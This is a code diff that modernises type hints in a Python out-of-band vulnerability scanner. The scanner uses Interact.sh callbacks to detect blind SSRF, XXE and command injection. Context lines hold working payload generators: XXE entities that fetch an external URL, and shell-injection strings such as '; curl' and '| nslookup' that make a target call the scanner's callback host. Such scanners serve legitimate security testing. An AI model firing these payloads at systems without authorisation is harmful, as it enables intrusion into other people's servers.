@@ -1,12 +1,9 @@
-import uuid
 import asyncio
-from typing import List, Dict, Optional
+import uuid
 
 # Assuming core modules are available
 from core.client import AsyncNetworkEngine
-from core.ui import ph, i, p, w, s, draw_table, G, R, N, W, C
-
-
+from core.ui import C, G, N, R, W, draw_table, i, p, ph, s, w
 from runners.shared import inject_query_payload
 
 try:
@@ -38,7 +35,7 @@ class InteractshClient:
         except Exception:
             return False
 
-    async def _poll(self) -> List[Dict]:
+    async def _poll(self) -> list[dict]:
         """Poll once and collect interactions."""
         if not self._client or not self._initialized:
             return []
@@ -67,7 +64,7 @@ class InteractshClient:
             except Exception:
                 pass
 
-    def get_hits(self, marker: str) -> List[Dict]:
+    def get_hits(self, marker: str) -> list[dict]:
         matched = [h for h in self.hits if marker in str(h)]
         self.hits = [h for h in self.hits if marker not in str(h)]
         return matched
@@ -82,7 +79,7 @@ class OOBDetector:
     # mengerumuni satu gate engine dan hasilnya tetap terbuang saat timeout.
     MAX_TASKS = 400
 
-    def __init__(self, target: str, services: List[Dict], params: Dict,
+    def __init__(self, target: str, services: list[dict], params: dict,
                  network_engine: AsyncNetworkEngine, session_manager=None,
                  allow_post: bool = True):
         self.target = target
@@ -90,7 +87,7 @@ class OOBDetector:
         self.params = params
         self.engine = network_engine
         self.session_manager = session_manager
-        self.findings: List[Dict] = []
+        self.findings: list[dict] = []
         self.interactsh = InteractshClient()
         self.allow_post = allow_post
         # Dispatch dipotong lebih awal supaya sisa jatah waktu tersedia
@@ -100,7 +97,7 @@ class OOBDetector:
     def _generate_marker(self, prefix: str) -> str:
         return f"{prefix}-{uuid.uuid4().hex[:8]}"
 
-    def _blind_ssrf_payloads(self, marker: str) -> List[str]:
+    def _blind_ssrf_payloads(self, marker: str) -> list[str]:
         cb = f"{marker}.{self.interactsh.domain}"
         return [
             f"http://{cb}",
@@ -110,14 +107,14 @@ class OOBDetector:
             f"dict://{cb}:11211/"
         ]
 
-    def _blind_xxe_payloads(self, marker: str) -> List[str]:
+    def _blind_xxe_payloads(self, marker: str) -> list[str]:
         cb = f"http://{marker}.{self.interactsh.domain}/xxe"
         return [
             f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{cb}">]><root>&xxe;</root>',
             f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{cb}">%xxe;]><root>test</root>'
         ]
 
-    def _blind_rce_payloads(self, marker: str) -> List[str]:
+    def _blind_rce_payloads(self, marker: str) -> list[str]:
         cb = f"{marker}.{self.interactsh.domain}"
         return [
             f"; curl http://{cb}",
@@ -128,7 +125,7 @@ class OOBDetector:
             f"| nslookup {cb}"
         ]
 
-    async def _test_target(self, task_type: str, url: str, param: Optional[str]):
+    async def _test_target(self, task_type: str, url: str, param: str | None):
         marker = self._generate_marker(task_type)
         payloads = []
         
@@ -158,7 +155,7 @@ class OOBDetector:
         # We don't block here. Polling happens in the background.
         return marker, url, param
 
-    def _build_tasks(self) -> List:
+    def _build_tasks(self) -> list:
         """Bangun daftar task blind. Task 'xxe' = POST-only (XML body),
         jadi dibuang kalau allow_post=False (mode selain 4)."""
         tasks = []
@@ -180,7 +177,7 @@ class OOBDetector:
             tasks = tasks[:self.MAX_TASKS]
         return tasks
 
-    async def run(self) -> List[Dict]:
+    async def run(self) -> list[dict]:
         ph("OOB DETECTOR: Async Blind Vulnerability Hunting (Interact.sh)")
 
         success = await self.interactsh._register()
